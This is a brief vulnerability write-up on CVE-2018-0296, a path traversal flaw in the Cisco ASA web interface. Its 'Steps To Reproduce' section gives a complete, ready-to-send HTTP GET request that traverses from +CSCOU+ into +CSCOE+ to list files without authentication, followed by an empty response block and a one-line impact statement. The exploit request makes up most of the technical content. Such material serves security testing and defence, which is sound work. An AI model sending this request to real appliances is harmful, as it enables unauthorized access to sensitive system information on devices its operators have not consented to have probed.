# Path Traversal (CVE-2018-0296)

A vulnerability in the web interface of the Cisco Adaptive Security Appliance (ASA) could allow an unauthenticated, remote attacker to cause an affected device to reload unexpectedly, resulting in a denial of service (DoS) condition. An attacker could view sensitive system information without authentication by using directory traversal techniques. 

## Steps To Reproduce

List files in folder +CSCOE+
```
GET /+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b HTTP/1.1
Host: $HOST
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36
Connection: close
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en

```

Response
```

```
 

## Impact

A path traversal vulnerability allows an attacker to access files on your web server to which they should not have access
